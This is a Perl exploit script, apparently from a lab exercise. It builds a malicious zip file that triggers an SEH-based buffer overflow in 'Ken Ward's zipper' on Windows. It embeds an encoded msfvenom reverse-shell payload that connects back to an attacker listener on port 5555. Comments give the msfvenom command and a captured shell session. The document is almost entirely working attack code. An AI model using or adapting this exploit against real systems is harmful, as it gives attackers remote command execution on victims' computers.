# Exploit script for Ken Ward's zipper
# Written by Peter Van Eeckhoutte
# http://www.corelan.be:8800
# TESTED ON WINDOW VISTA 
#---------------------------------------------------
#root@kali:/var/www/html# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.102.21] from (UNKNOWN) [192.168.102.152] 49176
#Microsoft Windows [Version 6.0.6000]
#Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
#
#C:\Users\offsec\Desktop>

my $sploitfile="corelan_kenward.zip";
my $ldf_header = "\x50\x4B\x03\x04\x14\x00\x00".
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\xe4\x0f" .
"\x00\x00\x00";

my $cdf_header = "\x50\x4B\x01\x02\x14\x00\x14".
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\xe4\x0f".
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";

my $eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00".
"\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00".
"\x02\x10\x00\x00".
"\x00\x00";

print "[+] Preparing payload\n";

#00423233  |. 5E             POP ESI
#00423234  |. 5B             POP EBX
#00423235  \. C3             RETN

my $nseh="\x89\x93\x89\x93";

my $badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f".
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x3f\x40".
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5d\x5e\x5f".
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f".
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f".
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf".
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf".
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff");

#root@kali:/var/www/html# msfvenom -p windows/shell_reverse_tcp lhost=192.168.102.21 lport=5555 -e x86/alpha_mixed BufferRegister=EAX
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 702 (iteration=0)
#x86/alpha_mixed chosen with final size 702
#Payload size: 702 bytes
#PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIIl8hLBuPwpGpsPK9KU01kp54nkf06PNkF26lNk3beDnkPr7Xfox70JUvVQIonLWLPacLdB6LupiQhOTMs1xGZBXrF2v7nkcbR0nkQZulNkBlb13Hm3QXgqjqv1NksigPWqN3LKPIR88cvZRinkGDNkUQN6eaIoLlo18ODMvaIWP89psE8v4CcMYh7K3MTd45jDPXnkrxTduQiCsVlKFl2knkrxWleQzsnkfdLKwqjplIw45tddqKaKCQPYBzf1ioipaOCoQJnkeBzKNmaMaxUc6RuPwpCX0wt3drCoBtBHrlBW4fWwyoXUNXz0EQwpEPeyo4Btbpph4iMP0kUPio9Ev0pPRpv0Cp601PF0sXxjfo9OKP9ojumGrJdErH9Py8u6TUSXDBC0DULsNim6qzB02vf7bHj9MucD1qyoJuk5O0rTVlyoPNUXrUHlrHL0h5oRv6ioZuPh3SRM0duPniHc1GV7SgP1IfCZB2v9aFm2im0fiWPDEtElfaWqNmCta4R0yVc0PDsd0PbvaFCfW60VpNf666cc1F0ht9HLGOnfiokeLIm0bn1FPF9oFPPh5XNg5Me0kO8UOKL0luNBbvSXLfMEMmomyoyE7LC61lwzmPikypBU4EMk2g5C2R0obJ7p3cYohUAA

my $exploit="PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIIl8hLBuPwpGpsPK9KU01kp54nkf06PNkF26lNk3beDnkPr7Xfox70JUvVQIonLWLPacLdB6LupiQhOTMs1xGZBXrF2v7nkcbR0nkQZulNkBlb13Hm3QXgqjqv1NksigPWqN3LKPIR88cvZRinkGDNkUQN6eaIoLlo18ODMvaIWP89psE8v4CcMYh7K3MTd45jDPXnkrxTduQiCsVlKFl2knkrxWleQzsnkfdLKwqjplIw45tddqKaKCQPYBzf1ioipaOCoQJnkeBzKNmaMaxUc6RuPwpCX0wt3drCoBtBHrlBW4fWwyoXUNXz0EQwpEPeyo4Btbpph4iMP0kUPio9Ev0pPRpv0Cp601PF0sXxjfo9OKP9ojumGrJdErH9Py8u6TUSXDBC0DULsNim6qzB02vf7bHj9MucD1qyoJuk5O0rTVlyoPNUXrUHlrHL0h5oRv6ioZuPh3SRM0duPniHc1GV7SgP1IfCZB2v9aFm2im0fiWPDEtElfaWqNmCta4R0yVc0PDsd0PbvaFCfW60VpNf666cc1F0ht9HLGOnfiokeLIm0bn1FPF9oFPPh5XNg5Me0kO8UOKL0luNBbvSXLfMEMmomyoyE7LC61lwzmPikypBU4EMk2g5C2R0obJ7p3cYohUAA";

my $sub="\x54\x58\x2D\x55\x55\x55\x55\x2d\x55\x55\x55\x55\x2d\x52\x4f\x55\x55\x71\x09";


my $stage2jump="\x82\xA2\x81\x98\x98"; 
#fffffcff 
my $payload ="B" x (261-length($sub)) . $sub . "A" x 9 . $exploit . "A" x (1022-261-9-length($exploit)-length($stage2jump)) . $stage2jump . $nseh . "\x33\x32\x42\x00" . "A" x 3034;
$payload = $payload.".bin";
my $evilzip = $ldf_header.$payload.
              $cdf_header.$payload.
                          $eofcdf_header;

print "[+] Removing old zip file\n";
system("del $sploitfile");
print "[+] Writing payload to file\n";
open(FILE,">$sploitfile");
print FILE $evilzip;
close(FILE);
print "[+] Wrote ".length($evilzip)." bytes to file $sploitfile\n";
print "[+] Payload length : " . length($payload)."\n";

